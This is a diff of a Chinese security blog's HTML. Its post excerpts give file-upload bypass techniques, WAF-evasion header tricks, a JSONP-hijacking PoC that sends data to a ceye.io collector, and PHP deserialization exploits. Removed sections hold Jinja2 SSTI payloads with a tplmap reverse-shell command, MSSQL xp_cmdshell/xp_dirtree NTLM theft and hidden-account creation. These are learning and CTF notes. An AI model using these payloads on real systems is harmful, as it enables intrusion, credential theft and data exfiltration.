+$fileType = &apos;&apos;;    
+switch($typeCode){      
+    case 255216:            
+        $fileType = &apos;jpg&apos;;
+        break;
+    case 13780:            
+        $fileType = &apos;png&apos;;
+        break;        
+    case 7173:            
+        $fileType = &apos;gif&apos;;
+        break;
+    default:            
+        $fileType = &apos;unknown&apos;;
+    }    
+    return $fileType;检验文件头，手动添加 GIF89a即可绕过；pass-14 、pass-15同理
+6、条件竞争绕过pass-17:     
+   $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);
+$file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];
+$temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+$file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
+$upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name;
+
+
+if(move_uploaded_file($temp_file, $upload_file)){
+    if(in_array($file_ext,$ext_arr)){
+         $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+         rename($upload_file, $img_path);
+         $is_upload = true;
+    }else{
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+        unlink($upload_file);
+    }在if判断之前，已经move_uploaded_file将文件上传到目录中，如果后缀不在白名单内再删除，此时利用竞争条件争在保存文件后删除文件前来执行php文件在burpsuit不断发包，然后网页不断刷新访问
+
+
+既然能执行命令，那么可以通过执行命令写一个webshell,pass-18同样是条件竞争
+upload_labs:这里面比较通杀的方法是采用aaa.php:jpg 的方法生成一个aaa.php的空文件，然后使用aaa.&lt;&lt;&lt;再次写入文件内容。
+7、解析漏洞绕过Apache1.X 2.X解析漏洞：Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止。shell.php.jpg  —&gt;被解析为php脚本执行
+IIS6.0中两个解析缺陷：（iis6.0 默认的可执行文件除了asp还包含这三种asa、cer、cdx） 
+目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析执行     
+xxx.jpg在xxx.asp目录下，xxx.jpg则按照asp解析执行文件名中如果包含.asp;、.asa;、.cer;则优先使用asp解析（这是因为在IIS6.0下，分号后面的不被解析）    xx.asp;.jpg被解析为asp脚本执行
+Nginx解析漏洞： 
+
+Nginx 0.5.* 
+Nginx 0.6.* 
+Nginx 0.7 &lt;= 0.7.65 
+Nginx 0.8 &lt;= 0.8.37
+
+以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求。
+IIS 7.0/Nginx0.8.41–1.5.6畸形解析漏洞
+上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg/.php进行请求。
+PHP CGI解析漏洞：
+IIS 7.0/7.5Nginx &lt; 0.8.3以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析
+多个Content-Disposition：
+在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过
+8、iconv函数限制上传在iconv转码的过程中,utf-&gt;gb2312(其他部分编码之间转换同样存在这个问题)会导致字符串被截断，如：
+$filename=”shell.php(hex).jpg”;(hex为0x80-0x99)，经过iconv转码后会变成$filename=”shell.php “;
+9、双文件上传：上传点支持多文件上传，但是却只对第一个文件做了过滤
+f12找到上传的post表单，action属性是指定上传检测页面，补全url: https://www.xxx.com/xxx.php(asp)，
+然后构造本地post提交表单第一个文件上传正常文件，第二个文件上传我们想要上传的webshell等
+10、waf缺陷绕过安全狗4.0：
+文件名回车绕过：（在文件名中插入特殊符号：分号、空格、单引号、换行符）
+filename=&quot;shell.php&quot;
+或者
+filename=&quot;shell.php&quot;==绕过：（===同样也可以过）
+filename==&quot;shell.php&quot;双写filename=;绕过
+filename=;filename=&quot;shell.php&quot;%00截断 在文件名后面加上%00然后CTRL+SHIFT+U转成字符，这里后面不用加.jpg也可以
+filename=&quot;shell.php .jpg&quot;上传文件的Content-Disposition扩展头字段在filename前插入任意字符长度?=508即可绕过安全狗上传任意后缀
+原因是文件Content-Disposition字段的长度验证不准确
+x*508;filename=&quot;shell.php&quot;垃圾字符填充：
+filename=&quot;%20*500+1.php&quot;修改头特征：
+去掉form-data
+原：
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
+bypass：
+Content-Disposition: name=&quot;file&quot;; filename=&quot;shell.php&quot;(form-data;的意思是内容描述，form-data的意思是来自表单的数据，但是即使不写form-data，apache也接受。)或者更改form-data为一些不相关的值；
+还可以增加额外的头进行干扰
+Content-Type: image/gif
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
+Content-Type: image/gif在http头增加额外字符：
+AAAAAAAA:filename=&quot;secquan.jpg&quot;;
+Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;shell.php&quot;
+Content-Type: image/gifBaidu cloud ：
+filename=&quot;xss.jpg .Php&quot;阿里云：
+删掉Content-Type: image/jpeg即可绕过
+云锁：正则的核心在匹配filename后面的值，思路是让它找不到匹配点。
+原：
+Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;
+bypass：
+Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=shell.php；对于换行等字符的其他应用：
+对filename进行换行
+filen
+ame=&quot;shell.php&quot;对 = 换行
+filename=
+&quot;shell.php&quot;Tr3jer_CongRong大佬的总结：
+
+filename在content-type下面
+.asp{80-90}
+NTFS ADS
+.asp…
+boundary不一致（boundary后添加空格）
+iis6分号截断asp.asp;asp.jpg
+apache解析漏洞php.php.ddd
+boundary和content-disposition中间插入换行
+hello.php:a.jpg然后hello.&lt;&lt;&lt;
+filename=php.php
+filename=”a.txt”;filename=”a.php”
+name=\n”file”;filename=”a.php”
+content-disposition:\n
+.htaccess文件
+a.jpg.\nphp
+去掉content-disposition的form-data字段
+php&lt;5.3 单双引号截断特性
+删掉content-disposition: form-data;
+content-disposition\00:
+{char}+content-disposition
+head头的content-type: tab
+head头的content-type: multipart/form-DATA
+filename后缀改为大写
+head头的Content-Type: multipart/form-data;\n
+.asp空格
+.asp0x00.jpg截断
+双boundary
+file\nname=”php.php”
+head头content-type空格:
+form-data字段与name字段交换位置
+
+链接：https://www.cnblogs.com/-qing-/p/10832850.html
+https://xz.aliyun.com/t/2435
+https://paper.seebug.org/219/
+
+
+</section>
+    <p class="sub">May 24, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/05/21/HSTS-bypassing/" class="title">HSTS bypassing</a>
     <section class="desc">
   HSTS：HTTP Strict Transport SecurityHSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。
@@ -833,158 +1387,6 @@ Content-Length: 52
   </div>
 </div>-->
 <!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/" class="title">调用API绕过杀软添加用户</a>
-    <section class="desc">
-  创建隐藏账户：
-net user tw$ password /add  ###用户名为tw，密码为password的
-也可以通过修改注册表实现，需要system权限    如何发现隐藏账户：
-通过组查看：
-net localgroup administrators 
-net localgroup users直接查看注册表，有什么用户一目了然HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
-一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过
-实现：
-微软提供C++实现原型：
-#ifndef UNICODE
-#define UNICODE
-#endif
-#pragma comment(lib, &quot;netapi32.lib&quot;)
-
-#include &lt;stdio.h&gt;
-#include &lt;assert.h&gt;
-#include &lt;windows.h&gt; 
-#include &lt;lm.h&gt;
-
-int wmain(int argc, wchar_t *argv[])
-{
-   LPGROUP_USERS_INFO_0 pBuf = NULL;
-   DWORD dwLevel = 0;
-   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
-   DWORD dwEntriesRead = 0;
-   DWORD dwTotalEntries = 0;
-   NET_API_STATUS nStatus;
-
-   if (argc != 3)
-   {
-  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);
-  exit(1);
-   }
-
-   nStatus = NetUserGetGroups(argv[1],
-  argv[2],
-  dwLevel,
-  (LPBYTE*)&amp;pBuf,
-  dwPrefMaxLen,
-  &amp;dwEntriesRead,
-  &amp;dwTotalEntries);
-
-   if (nStatus == NERR_Success)
-   {
-  LPGROUP_USERS_INFO_0 pTmpBuf;
-  DWORD i;
-  DWORD dwTotalCount = 0;
-
-  if ((pTmpBuf = pBuf) != NULL)
-  {
- fprintf(stderr, &quot;\nGlobal group(s):\n&quot;);
-
- for (i = 0; i &lt; dwEntriesRead; i++)
- {
-assert(pTmpBuf != NULL);
-
-if (pTmpBuf == NULL)
-{
-   fprintf(stderr, &quot;An access violation has occurred\n&quot;);
-   break;
-}
-
-wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);
-
-pTmpBuf++;
-dwTotalCount++;
- }
-  }
-
-  if (dwEntriesRead &lt; dwTotalEntries)
- fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);
-
-  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);
-   }
-   else
-  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);
-
-   if (pBuf != NULL)
-  NetApiBufferFree(pBuf);
-
-   return 0;
-}NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组
-我用C实现效果如下：
-
-
-</section>
-    <p class="sub">Apr 26, 2020</p>
-  </div>
-</div>-->
-<!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="title">SSTI[服务器模板注入]</a>
-    <section class="desc">
-  漏洞成因：
-用户输入未经过滤就交给引擎处理
-将python语句编译成一句话： 
-不同类型SSTI paylaod: 
-SSTI模板注入常见引擎：
-
-判断是哪种类型SSTI
-
-一个实例：
-nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI返回输入内容，已知
-
-检测SSTI
-
-name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）
-确定是jinja之后，尝试文件读取和命令执行
-读取文件
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
-命令执行：
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
-{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
-{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}SSTI注入工具tplmap： 
-python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999
-
-</section>
-    <p class="sub">Apr 26, 2020</p>
-  </div>
-</div>-->
-<!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/26/MSSQL-NTLM-stealer/" class="title">MSSQL NTLM stealer</a>
-    <section class="desc">
-  可窃取NTLM的漏洞及利用方式
-利用原理MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。
-如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希
-环境说明：https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL SQLi，发现高权限账户但无法读取密码
-漏洞利用
-默认情况ASP/MSSQL支持堆叠注入：
-常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令
-https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：
-http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed
-猜测是没有权限的问题，想到xp_dirtree外带数据：
-payload：
-http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-
-
-
-</section>
-    <p class="sub">Apr 26, 2020</p>
-  </div>
-</div>-->
-<!---->
 <!--
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
@@ -998,6 +1400,605 @@ http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varch
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="jsonp劫持" alt="jsonp劫持" href="/2020/05/24/jsonp%E5%8A%AB%E6%8C%81/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="jsonp劫持" alt="jsonp劫持"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; jsonp劫持 &gt;</div>
+                            <div class="content flex1">
+                                
+  JSONP(JSON with Padding)是JSON的一种“使用模式”，创建JSONP是为了授予对JavaScript的跨域读取访问权限，可用于绕过SOP访问跨域数据。
+[同源策略]SOP（ Same Origin Policy 策略由浏览器实施，以防止一个Web应用程序从其他Web应用程序检索信息
+JSONP 就是为了跨域获取资源而产生的一种非官方的技术手段(官方的有 CORS 和 postMessage),它利用的是 script 标签的 src 属性不受同源策略影响的特性，
+JSONP(JSON with Padding)是JSON的一种“使用模式”
+jsonp劫持： jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据（引诱用户点击访问链接，获取API返回给用户的信息）
+漏洞源码 
+getUser.php
+&lt;?php
+header(&apos;Content-type: application/json&apos;);
+$jsoncallback = htmlspecialchars($_REQUEST [&apos;jsoncallback&apos;]);//获取回调函数名
+//json数据
+//$json_data = &apos;[&quot;id&quot;,&quot;user&quot;]&apos;;
+$json_data=&apos;({&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Aaron&quot;})&apos;;
+echo $jsoncallback . &quot;(&quot; . $json_data . &quot;)&quot;;//输出jsonp格式的数据
+?&gt;客户端实现 callbackFunction 函数
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;JSONP劫持测试&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+function callbackFunction(result)
+    {
+        alert(result.name);
+    }
+&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/getUser.php?jsoncallback=callbackFunction&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;jsonp漏洞挖掘：首先把Preserve log选项勾上，防止页面刷新跳转的时候访问记录被重置，也方便进行下一步的筛选。
+
+然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 func、function、call、jsonp、jsonpcallback、callback、cb、json、 email
+一次SRC实战漏洞挖掘（没有敏感信息，这里仅作演示）
+
+callback函数可控，测试跨域劫持。poc：
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;UTF-8&quot;&gt;
+&lt;title&gt;JSONP EXP跨域测试&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;
+function jsonpjack(json){
+new Image().src=&quot;http://xxxx.ceye.io/&quot; + JSON.stringify(json)
+}
+&lt;/script&gt;
+&lt;script src=&quot;https://xxxxxsss.baidu.com/new/ApiHome/OneStop/loginTopicInterface?callback=jsonpjack&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;ceye返回结果：
+
+https://www.freebuf.com/articles/web/126347.html
+https://securitycafe.ro/2017/01/18/practical-jsonp-injection/
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>May 24, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="PHP反序列化漏洞学习" alt="PHP反序列化漏洞学习" href="/2020/05/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="PHP反序列化漏洞学习" alt="PHP反序列化漏洞学习"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; PHP反序列化漏洞学习 &gt;</div>
+                            <div class="content flex1">
+                                
+  什么是序列化&amp;反序列化：序列化的目的是为了将一个对象通过可保存的字节方式存储起来，这样就可以将序列化字节存储到数据库或者文本当中，当需要的时候再通过反序列化获取
+所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示
+unserialize()函数能够重新把字符串变回php原来的值
+序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。
+serialize()：
+&lt;?php
+class Tw{
+    public $name = &quot;Twe1ve&quot;;    
+    private $sex = &quot;Male&quot;;
+}
+$Tw_n = new Tw;
+$ser = serialize($Tw_n);
+echo $ser;
+echo &quot;&lt;/br&gt;&quot;;
+echo urlencode($ser);
+?&gt;输出结果如下：
+O:2:&quot;Tw&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;Twe1ve&quot;;s:7:&quot;Twsex&quot;;s:4:&quot;Male&quot;;}
+O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7DO:2:Tw:2:   O代表存储的是对象(object),a的话则代表数组，2指代对象名称有两个字符，Tw则是对象名,2则代表有两个值
+{s:4:”name”;s:6:”Twe1ve”;s:7:”Twsex”;s:4:”Male”;}   {}内为属性字符数：属性值；s表示字符串，由于private属性会在类名两侧加入空字节，所以此处Twsex的名称长度7，实际为%00Tw%00sex
+unserialize(): [存在private属性的类，需要先将原有的序列化值urlencode输出，再进行反序列化]
+&lt;?php
+$str = &apos;O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7D&apos;;
+$data = urldecode($str);
+$unser = unserialize($data);
+var_dump($unser);
+?&gt;结果：
+object(__PHP_Incomplete_Class)[1]
+  public &apos;__PHP_Incomplete_Class_Name&apos; =&gt; string &apos;Tw&apos; (length=2)
+  public &apos;name&apos; =&gt; string &apos;Twe1ve&apos; (length=6)
+  private &apos;sex&apos; (Tw) =&gt; string &apos;Male&apos; (length=4)在反序列化对象之后，需要当前作用域中存在该类的定义，否则php无法将类对应到指定类
+可以看到，当定义域中不存在该类时会反序列化出一个__PHP_Incomplete_Class的类，也就是一个不完整的类
+其次，在反序列化的过程中，只保存原有类的变量值，并不会保存其函数，具体的函数功能是根据定义域中定义好的函数功能来执行
+&lt;?php
+class Tw{
+    public $name = &quot;Twe1ve&quot;;    
+    private $sex = &quot;Male&quot;;
+}
+$str = &apos;O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7D&apos;;
+$data = urldecode($str);
+$unser = unserialize($data);
+var_dump($unser);
+?&gt;结果：
+object(Tw)[1]
+  public &apos;name&apos; =&gt; string &apos;Twe1ve&apos; (length=6)
+  private &apos;sex&apos; =&gt; string &apos;Male&apos; (length=4)利用构造函数等魔术方法（Magic function）：
+
+__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。
+__destruct()：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，当对象被销毁时会自动调用。
+__wakeup()：如前所提，unserialize()时会检查是否存在 __wakeup()，如果存在，则会优先调用 __wakeup()方法。
+__toString():用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时就会调用。
+__sleep():用于提交未提交的数据，或类似的清理操作，因此当一个对象被序列化的时候被调用。
+…..
+
+魔术方法执行顺序：__wakeup()&gt; __toString()&gt; __destruct()
+漏洞利用1、直接调用，危险函数直接在类中被调用
+class cls{
+   var $value = &apos;echo 123;&apos;;
+   function action(){
+eval($this-&gt;value);
+}
+}
+$a = unserialize(&apos;O:3:&quot;cls&quot;:1:{s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;}&apos;);
+$a-&gt;action();2、危险函数在魔术方法中
+class cls{
+var $value = &apos;echo 123;&apos;;
+function __wakeup(){
+eval($this-&gt;value);
+}
+}
+$a = unserialize(&apos;O:3:&quot;cls&quot;:1:{s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;}&apos;);3、危险函数在其他类中被调用
+当一个类中的成员变量是另一个类，且调用了另一个类中的危险函数。此时就可以序列化前者类，从而触发触发漏洞
+&lt;?php
+class cls1{
+var $ser;
+function __construct(){
+$ser = new ser2();
+}
+function __wakeup(){
+$this-&gt;ser-&gt;evil();
+}
+}
+class cls2{
+var $value = &quot;echo 123;&quot;;
+function evil(){
+eval($this-&gt;value);
+}
+}
+$cls = $GET[&apos;cls&apos;];
+$instance = unserialize($cls);
+?&gt;exp：
+&lt;?php
+class cls1{
+  var $ser;
+function __construct(){
+   $this-&gt;ser = new cls2();
+   }
+}
+class cls2{
+var $value = &apos;phpinfo();&apos;;
+}
+print_r(serialize(new cls1()))
+
+?&gt;第二届网鼎杯反序列化题目：
+&lt;?php
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+class FileHandler {
+protected $op;
+protected $filename;
+protected $content;
+function __construct() {
+    $op = &quot;1&quot;;
+    $filename = &quot;/tmp/tmpfile&quot;;
+    $content = &quot;Hello World!&quot;;
+    $this-&gt;process();
+}
+public function process() {
+    if($this-&gt;op == &quot;1&quot;) {
+        $this-&gt;write();
+    } else if($this-&gt;op == &quot;2&quot;) {
+        $res = $this-&gt;read();
+        $this-&gt;output($res);
+    } else {
+        $this-&gt;output(&quot;Bad Hacker!&quot;);
+    }
+}
+private function write() {
+    if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
+        if(strlen((string)$this-&gt;content) &gt; 100) {
+            $this-&gt;output(&quot;Too long!&quot;);
+            die();
+        }
+        $res = file_put_contents($this-&gt;filename, $this-&gt;content);
+        if($res) $this-&gt;output(&quot;Successful!&quot;);
+        else $this-&gt;output(&quot;Failed!&quot;);
+    } else {
+        $this-&gt;output(&quot;Failed!&quot;);
+    }
+}
+private function read() {
+    $res = &quot;&quot;;
+    if(isset($this-&gt;filename)) {
+        $res = file_get_contents($this-&gt;filename);
+    }
+    return $res;
+}
+private function output($s) {
+    echo &quot;[Result]:
+&quot;;
+    echo $s;
+}
+function __destruct() {
+    if($this-&gt;op === &quot;2&quot;)
+        $this-&gt;op = &quot;1&quot;;
+    $this-&gt;content = &quot;&quot;;
+    $this-&gt;process();
+}
+}
+function is_valid($s) {
+for($i = 0; $i &lt; strlen($s); $i++)
+    if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+        return false;
+return true;
+}
+if(isset($_GET{&apos;str&apos;})) {
+$str = (string)$_GET[&apos;str&apos;];
+if(is_valid($str)) {
+    $obj = unserialize($str);
+}
+}is_valid : 判断传入字符是否为可打印字符，由于这里的属性均为protected，会生成 %00，但是由于php7对类的修饰不敏感，直接把属性改为public可绕过
+__destruct中为强类型比较，还会讲$op置1，process读取文件，需要让$op为2，由于process使用==弱类型比较，直接让$op=2绕过
+&lt;?php
+class FileHandler {
+public $op = 2 ;
+public $filename = &quot;flag.php&quot; ;
+}
+$class = new FileHandler();
+$ser = serialize($class);
+echo $ser;
+?&gt;O:11:”FileHandler”:2:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;}
+链接：https://www.kingkk.com/2018/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
+https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
+https://xz.aliyun.com/t/3674
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>May 24, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="文件上传漏洞学习" alt="文件上传漏洞学习" href="/2020/05/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="文件上传漏洞学习" alt="文件上传漏洞学习"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 文件上传漏洞学习 &gt;</div>
+                            <div class="content flex1">
+                                
+  *上传函数： *
+move_upload_file()关于PHP中$_FILES数组的使用方法: 
+
+$_FILES[‘file’][‘name’] 客户端文件名称
+$_FILES[‘file’][‘type’] 文件的MIME类型
+$_FILES[‘file’][‘size’] 文件大小 单位字节
+$_FILES[‘file’][‘tmp_name’] 文件被上传后再服务器端临时文件名，可以在php.ini中指定
+
+1、未过滤或前端过滤，upload_labs-pass 1
+&lt;script type=&quot;text/javascript&quot;&gt;
+function checkFile() {
+    var file = document.getElementsByName(&apos;upload_file&apos;)[0].value;
+    if (file == null || file == &quot;&quot;) {
+        alert(&quot;请选择要上传的文件!&quot;);
+        return false;
+    }
+    //定义允许上传的文件类型
+    var allow_ext = &quot;.jpg|.png|.gif&quot;;
+    //提取上传文件的类型
+    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
+    //判断上传文件类型是否允许上传
+    if (allow_ext.indexOf(ext_name) == -1) {
+        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
+        alert(errMsg);
+        return false;
+    }
+}
+&lt;/script&gt;2、content-type验证绕过pass-2：
+if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;]== &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) {
+    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+    $img_path = UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;];        这里仅仅对content-type进行验证，burpsuit抓包之后修改content-type类型即可绕过
+3、黑名单限制后缀名绕过pass-3
+if (file_exists(UPLOAD_PATH)) {
+    $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;);
+    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+    $file_name = deldot($file_name);//删除文件名末尾的点
+    $file_ext = strrchr($file_name, &apos;.&apos;);
+    $file_ext = strtolower($file_ext); //转换为小写
+    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+    $file_ext = trim($file_ext); //收尾去空
+    if(!in_array($file_ext, $deny_ext)) {
+        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;    
+黑名单过滤不全面，php3、php5、phhtml等后缀绕过
+黑名单过滤不全面，由于这里不限制.htaccess，可通过上传一个.htaccess重写文件解析规则
+
+pass-4   
